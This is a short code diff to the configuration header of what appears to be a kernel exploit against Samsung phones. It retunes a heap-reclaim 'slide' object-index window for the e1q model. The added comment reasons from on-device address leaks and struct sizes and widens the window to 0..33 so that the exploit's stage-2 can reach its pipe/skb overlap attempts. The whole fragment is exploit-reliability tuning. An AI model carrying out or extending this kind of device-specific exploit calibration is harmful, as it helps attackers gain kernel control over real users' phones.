@@ -72,8 +72,18 @@
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 27
-#define APP_SLIDE_MAX_OBJECT_INDEX 30
+/*
+ * e1q device-calibrated object index window for the reclaimed 32K page.
+ * The S24-family 27..30 was calibrated on e1s/e2s where MM_STRUCT_SZ=0x400;
+ * e1q's image-verified MM_STRUCT_SZ=0x3c0 yields a different object grid, and
+ * on-device leaks land at object_index 8..25 (e.g. 0x5dc0/0x3c0 = 25), which
+ * the copied 27..30 window rejects.  In FRESH mode this check is enforced in
+ * prepare_kernel_page() (the non-FRESH path only logs), so the copied window
+ * made FRESH stage-2 fail 100% before any gate attempt.  Accept the full
+ * in-page range (0..33) so FRESH can reach the pipe/skb overlap retries.
+ */
+#define APP_SLIDE_MIN_OBJECT_INDEX 0
+#define APP_SLIDE_MAX_OBJECT_INDEX 33
 #define APP_FOPS_MIN_OBJECT_INDEX 24
 #define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
 #define APP_FOPS_PSELECT_DELAY_USEC 50000
